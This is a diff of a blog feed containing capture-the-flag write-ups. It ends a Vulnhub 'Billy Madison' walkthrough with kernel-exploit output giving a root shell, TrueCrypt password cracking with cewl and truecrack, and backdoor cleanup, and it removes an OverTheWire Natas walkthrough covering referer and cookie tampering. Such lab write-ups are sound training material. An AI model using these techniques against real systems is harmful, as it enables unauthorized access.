+current packet version &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2
+pbd-&amp;gt;hdr.bh1.offset_to_first_pkt &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 48
+race not won
+
+retrying stage..
+new exploit attempt starting, jumping to 0xffffffff81286e50, &lt;span class=&quot;nv&quot;&gt;arg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0xffffffffff600850
+sockets allocated
+removing barrier and spraying..
+version switcher stopping, x &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; -1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;y &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 158827, last val &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+current packet version &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
+pbd-&amp;gt;hdr.bh1.offset_to_first_pkt &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
+race not won
+
+retrying stage..
+new exploit attempt starting, jumping to 0xffffffff81286e50, &lt;span class=&quot;nv&quot;&gt;arg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0xffffffffff600850
+sockets allocated
+removing barrier and spraying..
+version switcher stopping, x &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; -1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;y &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 99401, last val &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+current packet version &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0
+pbd-&amp;gt;hdr.bh1.offset_to_first_pkt &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 48
+&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; TPACKET_V1 &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; offset_to_first_pkt !&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 0, race won &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
+please &lt;span class=&quot;nb&quot;&gt;wait &lt;/span&gt;up to a few minutes &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;timer to be executed. &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;you ctrl-c now the kernel will hang. so dont &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;that.
+closing socket and verifying.......
+sysctl added!
+
+stage 2 completed
+binary executed by kernel, launching rootshell
+&lt;span class=&quot;gp&quot;&gt;root@BM:~# &lt;/span&gt;whoami
+root
+root@BM:~#&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Great, it's working! Now it's time to look for the last flag. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@BM:/home/billy# &lt;/span&gt;ls
+billy-shampoo-animated.gif  billy-shampoo.jpg  billy-smartestmanalive.gif  pics
+root@BM:/home/billy#&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;It's definitely not here, altough there's another portion of pictures. &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/billy-madison/eric-unimpressed.jpg&quot; alt=&quot;Eric unimpressed&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Let's keep looking. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@BM:/# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /
+&lt;span class=&quot;gp&quot;&gt;root@BM:/# &lt;/span&gt;ls -la
+total 105
+drwxr-xr-x  25 root root  4096 Mar 14 15:13 .
+drwxr-xr-x  25 root root  4096 Mar 14 15:13 ..
+drwxr-xr-x   2 root root  4096 Mar 14 15:11 bin
+drwxr-xr-x   4 root root  1024 Mar 14 15:14 boot
+drwxr-xr-x   2 root root  4096 Aug 18  2016 capture
+drwxr-xr-x  20 root root  4220 Mar 14 15:06 dev
+drwxr-xr-x 105 root root  4096 Mar 14 15:14 etc
+drwxr-xr-x   6 root root  4096 Aug 20  2016 home
+lrwxrwxrwx   1 root root    32 Mar 14 15:13 initrd.img -&amp;gt; boot/initrd.img-4.4.0-66-generic
+lrwxrwxrwx   1 root root    32 Aug 30  2016 initrd.img.old -&amp;gt; boot/initrd.img-4.4.0-36-generic
+drwxr-xr-x  23 root root  4096 Aug 16  2016 lib
+drwxr-xr-x   2 root root  4096 Aug  5  2016 lib64
+-rw-r--r--   1 root root   520 Aug 20  2016 log.txt
+drwx------   2 root root 16384 Aug  5  2016 lost+found
+drwxr-xr-x   3 root root  4096 Aug  5  2016 media
+drwxr-xr-x   2 root root  4096 Jul 19  2016 mnt
+drwxr-xr-x  11 root root  4096 Aug 22  2016 opt
+drwx------   2 root root  4096 Aug 29  2016 PRIVATE
+dr-xr-xr-x 228 root root     0 Mar 14 15:06 proc
+drwx------   8 root root  4096 Mar 14 15:06 root
+drwxr-xr-x  25 root root  1060 Mar 14 15:17 run
+drwxr-xr-x   2 root root 12288 Mar 14 15:11 sbin
+drwxr-xr-x   2 root root  4096 Jun 29  2016 snap
+drwxr-xr-x   2 root root  4096 Jul 19  2016 srv
+dr-xr-xr-x  13 root root     0 Mar 14 15:38 sys
+drwxrwxrwt   9 root root  4096 Mar 14 15:40 tmp
+drwxr-xr-x  10 root root  4096 Aug  5  2016 usr
+drwxr-xr-x  14 root root  4096 Aug 11  2016 var
+lrwxrwxrwx   1 root root    29 Mar 14 15:13 vmlinuz -&amp;gt; boot/vmlinuz-4.4.0-66-generic
+lrwxrwxrwx   1 root root    29 Aug 30  2016 vmlinuz.old -&amp;gt; boot/vmlinuz-4.4.0-36-generic
+&lt;span class=&quot;gp&quot;&gt;root@BM:/# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;PRIVATE
+&lt;span class=&quot;gp&quot;&gt;root@BM:/PRIVATE# &lt;/span&gt;ls -la
+total 1036
+drwx------  2 root  root     4096 Aug 29  2016 .
+drwxr-xr-x 25 root  root     4096 Mar 14 15:13 ..
+-rw-rw-r--  1 billy billy 1048576 Aug 21  2016 BowelMovement
+-rw-r--r--  1 root  root      221 Aug 29  2016 hint.txt
+&lt;span class=&quot;gp&quot;&gt;root@BM:/PRIVATE# &lt;/span&gt;cat hint.txt
+Heh, I called the file BowelMovement because it has the same initials as
+Billy Madison.  That truely cracks me up!  LOLOLOL!
+
+I always forget the password, but it&lt;span class=&quot;s1&quot;&gt;'s here:
+
+https://en.wikipedia.org/wiki/Billy_Madison
+
+-EG&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h2&gt;Cracking the flag&lt;/h2&gt;
+
+&lt;p&gt;Hmm, it seems that we have to create another &lt;b&gt;wordlist&lt;/b&gt; from Wikipedia entry. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;cewl --depth 0 -w wiki.list https://en.wikipedia.org/wiki/Billy_Madison
+CeWL 5.2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Some Chaos&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Robin Wood &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;robin@digi.ninja&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;https://digi.ninja/&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;We can now try to crack it using &lt;b&gt;truecrack&lt;/b&gt; tool. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;truecrack -w wiki.list -t BowelMovement
+TrueCrack v3.0
+Website: http://code.google.com/p/truecrack
+Contact us: infotruecrack@gmail.com
+Found password:        &lt;span class=&quot;s2&quot;&gt;&quot;execrable&quot;&lt;/span&gt;
+Password length:    &lt;span class=&quot;s2&quot;&gt;&quot;10&quot;&lt;/span&gt;
+Total computations:    &lt;span class=&quot;s2&quot;&gt;&quot;603&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Another victory! We can now mount it using &lt;b&gt;veracrypt&lt;/b&gt;, and see if there are final flags. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;veracrypt -tc BowelMovement billy-vera
+Enter password &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; /root/BowelMovement:
+Enter keyfile &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;none]:
+Protect hidden volume &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;any&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;? &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Yes/n&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;No&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;No]:
+&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;billy-vera
+&lt;span class=&quot;gp&quot;&gt;root@kali:~/billy-vera# &lt;/span&gt;find . -ls
+        1     16 drwx------   3 root     root        16384 Dec 31  1969 .
+       65      1 -rwx------   1 root     root         1000 Aug 21 10:22 ./secret.zip
+       66      1 drwx------   2 root     root          512 Aug 21 10:39 ./&lt;span class=&quot;nv&quot;&gt;$RECYCLE&lt;/span&gt;.BIN
+       68      1 -rwx------   1 root     root          129 Aug 21 10:39 ./&lt;span class=&quot;nv&quot;&gt;$RECYCLE&lt;/span&gt;.BIN/desktop.ini
+&lt;span class=&quot;gp&quot;&gt;root@kali:~/billy-vera# &lt;/span&gt;unzip secret.zip
+Archive:  secret.zip
+inflating: Billy_Madison_12th_Grade_Final_Project.doc  
+inflating: THE-END.txt             
+&lt;span class=&quot;gp&quot;&gt;root@kali:~/billy-vera# &lt;/span&gt;cat THE-END.txt
+Congratulations!
+
+If you&lt;span class=&quot;s1&quot;&gt;'re reading this, you win!
+
+I hope you had fun.  I had an absolute blast putting this together.
+
+I'&lt;/span&gt;d love to have your feedback on the box - or at least know you pwned it!
+
+Please feel free to shoot me a tweet or email &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;7ms@7ms.us&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; and &lt;span class=&quot;nb&quot;&gt;let &lt;/span&gt;me know with
+the subject line: &lt;span class=&quot;s2&quot;&gt;&quot;Stop looking at me swan!&quot;&lt;/span&gt;
+
+Thanks much,
+
+Brian Johnson
+7 Minute Security
+www.7ms.us&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;We did it, what a great journey! Lastly, let's view Billy's assignment. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Billy Madison
+Final Project
+Knibb High
+
+
+
+                                       The Industrial Revolution
+
+The Industrial Revolution to me is just like a story I know called &lt;span class=&quot;s2&quot;&gt;&quot;The Puppy Who Lost His Way.&quot;&lt;/span&gt;
+The world was changing, and the puppy was getting... bigger.
+
+So, you see, the puppy was like industry. In that, they were both lost &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the woods.
+And nobody, especially the little boy - &lt;span class=&quot;s2&quot;&gt;&quot;society&quot;&lt;/span&gt; - knew where to find &lt;span class=&quot;s1&quot;&gt;'em.
+Except that the puppy was a dog.
+But the industry, my friends, that was a revolution.
+
+KNIBB HIGH FOOTBALL RULES!!!!!
+
+https://www.youtube.com/watch?v=BlPw6MKvvIc
+
+-BM&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h2&gt;Cleanup&lt;/h2&gt;
+
+&lt;p&gt;Our task was to also undo Eric's changes. Fistly let's disable &lt;b&gt;ssh&lt;/b&gt;. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@BM:~# &lt;/span&gt;update-rc.d ssh disable
+insserv: warning: current start runlevel&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;empty&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; of script &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;ssh&lt;span class=&quot;s1&quot;&gt;' overrides LSB defaults (2 3 4 5).
+insserv: warning: current stop runlevel(s) (2 3 4 5) of script `ssh'&lt;/span&gt; overrides LSB defaults &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;empty&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;We can also terminate the service with &lt;b&gt;service ssh stop&lt;/b&gt;.&lt;/p&gt;
+
+&lt;p&gt;We will also have to disable the backdoor, which is ssh service showing up after receiving email with certain phrase. We can do this by removing an entry from &lt;b&gt;crontab&lt;/b&gt;. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;*/1 * * * * /root/ssh/canyoussh.sh&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;We also have to delete eric's account. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@BM:~# &lt;/span&gt;userdel eric&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now let's disable port knocking sequence, which can be done by editing &lt;b&gt;/etc/knockd.conf&lt;/b&gt; file, then delete all files from web root directory and lastly change passwords to all of the accounts. &lt;/p&gt;
+
+&lt;p&gt;In addition, I've found that interesting binary at &lt;b&gt;/usr/local/share/sgml/donpcgd&lt;/b&gt;, which possibly is another way to gain root. We will have to delete it. &lt;/p&gt;
+
+&lt;h1&gt;Last words&lt;/h1&gt;
+
+&lt;p&gt;It was great fun to participate in this Vulnhub machine. Much thanks to &lt;a href=&quot;https://twitter.com/7MinSec&quot;&gt;Brian Johnson&lt;/a&gt; for creating this challenge and to &lt;b&gt;Yodak#2187&lt;/b&gt; for bringing up some ideas. I'm looking forward to try more machines and root them all! &lt;/p&gt;
+
+&lt;p&gt;Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Write-Ups" /><summary type="html">Introduction</summary></entry><entry><title type="html">Overthewire.org - Behemoth 0 -&amp;gt; 1</title><link href="http://localhost:4000/overthewire/2017/03/12/overthewire.org-behemoth-1/" rel="alternate" type="text/html" title="Overthewire.org - Behemoth 0 -&gt; 1" /><published>2017-03-12T00:00:00+00:00</published><updated>2017-03-12T00:00:00+00:00</updated><id>http://localhost:4000/overthewire/2017/03/12/overthewire.org-behemoth-1</id><content type="html" xml:base="http://localhost:4000/overthewire/2017/03/12/overthewire.org-behemoth-1/">&lt;h1&gt;Introduction&lt;/h1&gt;
+
+&lt;p&gt;Today we're going to attack another reverse engineering challenge, this time from the &lt;b&gt;Behemoth&lt;/b&gt; series. &lt;/p&gt;
 
 &lt;p&gt;&lt;i&gt;This wargame deals with a lot of regular vulnerabilities found commonly 'out
 in the wild'. While the game makes no attempts at emulating a real environment
@@ -1619,260 +2529,5 @@ cat /etc/narnia_pass/narnia1
 &lt;h1&gt;Last words&lt;/h1&gt;
 
 &lt;p&gt;As I never tought before, this was a great challenge, and I think I got more interested in binary exploitation and reverse engineering. Can't wait to try out some other challenges, and I'll see you in the next one!&lt;/p&gt;
-
-&lt;p&gt;~ Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Overthewire" /><summary type="html">Introduction</summary></entry><entry><title type="html">Overthewire.org - Natas</title><link href="http://localhost:4000/overthewire/2016/12/25/overthewire.org-natas/" rel="alternate" type="text/html" title="Overthewire.org - Natas" /><published>2016-12-25T00:00:00+00:00</published><updated>2016-12-25T00:00:00+00:00</updated><id>http://localhost:4000/overthewire/2016/12/25/overthewire.org-natas</id><content type="html" xml:base="http://localhost:4000/overthewire/2016/12/25/overthewire.org-natas/">&lt;h1&gt;Introduction&lt;/h1&gt;
-
-&lt;p&gt;Welcome back to another OverTheWire wargame called &quot;Leviathan&quot; - which is made only of tasks connected to web security. As the number of exercises is very big (33 at the time of publishing this post), I will break it down in a few smaller parts. Without wasting your time, let's get started! &lt;/p&gt;
-
-&lt;h1&gt;0&lt;/h1&gt;
-
-&lt;p&gt;Firstly, we are greeted with this message: &lt;/p&gt;
-&lt;pre&gt;You can find the password for the next level on this page.&lt;/pre&gt;
-&lt;p&gt;As you may suspect, password is hidden somewhere in the source code of the website. Let's take a look: &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;content&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-You can find the password for the next level on this page.
-
-&lt;span class=&quot;c&quot;&gt;&amp;lt;!--The password for natas1 is *********************** --&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;There it is, commented out. Now let's jump into the next level.&lt;/p&gt;
-
-&lt;h1&gt;1&lt;/h1&gt;
-
-&lt;p&gt;This time we have more 'serious' protection going on.&lt;/p&gt;
-&lt;pre&gt;You can find the password for the next level on this page, but rightclicking has been blocked!&lt;/pre&gt;
-&lt;p&gt;One of the ways to bypass this protection, is to enter &lt;b&gt;view-source:&lt;/b&gt; before the URL of the website. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;content&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-You can find the password for the
-next level on this page, but rightclicking has been blocked!
-
-&lt;span class=&quot;c&quot;&gt;&amp;lt;!--The password for natas2 is *********************** --&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;h1&gt;2&lt;/h1&gt;
-
-&lt;p&gt;This time, we have to look somewhere outside of the source code. &lt;/p&gt;
-&lt;pre&gt;There is nothing on this page&lt;/pre&gt;
-
-&lt;p&gt;The first thing that comes to my mind is &lt;b&gt;robots.txt&lt;/b&gt; - they sometimes contain very useful information. Unfortunately, it did not work out this time. But there was something that concerned me. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;content&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-There is nothing on this page
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;files/pixel.png&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;What is this &lt;b&gt;pixel.png&lt;/b&gt;? It's in the directory called files, maybe we'll find something more useful there.&lt;/p&gt;
-
-&lt;p&gt;Great, apart from pixel.png we have &lt;b&gt;users.txt&lt;/b&gt; containing pass for the next one!&lt;/p&gt;
-
-&lt;pre&gt;
-# username:password
-alice:BYNdCesZqW
-bob:jw2ueICLvT
-charlie:G5vCxkVV3m
-natas3:***********************
-eve:zo4mJWyNj2
-mallory:9urtcpzBmH
-&lt;/pre&gt;
-
-&lt;h1&gt;3&lt;/h1&gt;
-
-&lt;p&gt;Once again: &lt;/p&gt;
-&lt;pre&gt;There is nothing on this page&lt;/pre&gt;
-
-&lt;p&gt;But!&lt;/p&gt;
-&lt;p&gt;This time we have a clue in &lt;b&gt;robots.txt&lt;/b&gt;. I knew it will help at some point!&lt;/p&gt;
-&lt;pre&gt;
-User-agent: *
-Disallow: /s3cr3t/
-&lt;/pre&gt;
-
-&lt;p&gt;Going under this directory lets us view another users.txt with password to the next one. &lt;/p&gt;
-&lt;pre&gt;
-natas4:***********************
-&lt;/pre&gt;
-
-&lt;h1&gt;4&lt;/h1&gt;
-
-&lt;p&gt;Oh, something new!&lt;/p&gt;
-&lt;pre&gt;Access disallowed. You are visiting from &quot;&quot; while authorized users should come only from &quot;http://natas5.natas.labs.overthewire.org/&quot;&lt;/pre&gt;
-
-&lt;p&gt;It must be something with HTTP referer, changing it's property (spoofing) may allow me to enter. &lt;/p&gt;
-
-&lt;p&gt;After quick googling, I came up with this plugin for Chrome - &lt;a href=&quot;https://chrome.google.com/webstore/detail/referer-control/acehenlbileblompmkkoimgobmcdkgeb&quot;&gt;Referer Control&lt;/a&gt;. After changing the referer to this, provided in instructions, and refreshing the page I got the pass to the next one. &lt;/p&gt;
-
-&lt;pre&gt;
-Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
-&lt;/pre&gt;
-
-&lt;h1&gt;5&lt;/h1&gt;
-
-&lt;p&gt;But, how can I log in? :D&lt;/p&gt;
-
-&lt;pre&gt;Access disallowed. You are not logged in&lt;/pre&gt;
-
-&lt;p&gt;Actually, this level was very easy - using &lt;a href=&quot;http://www.editthiscookie.com/&quot;&gt;EditThisCookie&lt;/a&gt; I was able to change the value of loggedin cookie from 0 to 1, resulting in ability to view the password. &lt;/p&gt;
-
-&lt;pre&gt;
-Access granted. The password for natas6 is ***********************
-&lt;/pre&gt;
-
-&lt;h1&gt;6&lt;/h1&gt;
-
-&lt;p&gt;This time we've got simple form, with ability to view it's source code. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;includes/secret.inc&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-
-    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;array_key_exists&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;submit&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$secret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'secret'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Access granted. The password for natas7 is &amp;lt;censored&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Wrong secret&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Actually, we don't have to analyze whole code, what's essential is the &lt;b&gt;include&lt;/b&gt; part and since &lt;b&gt;$secret&lt;/b&gt; is assigned nowhere in this code I can assume, that it's in the secret.inc file. Let's check it!&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?&lt;/span&gt;
-&lt;span class=&quot;nv&quot;&gt;$secret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;FOEIUWGHFEEUHOFUOIU&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Now last thing is to enter the secret into the input form. &lt;/p&gt;
-&lt;p&gt;Great, it works!&lt;/p&gt;
-
-&lt;pre&gt;
-Access granted. The password for natas7 is ***********************
-&lt;/pre&gt;
-
-&lt;h1&gt;7&lt;/h1&gt;
-
-&lt;p&gt;In this level we have simple structure of the website - clicking the elements in the menu changes the content of the website. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;content&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;index.php?page=home&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Home&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
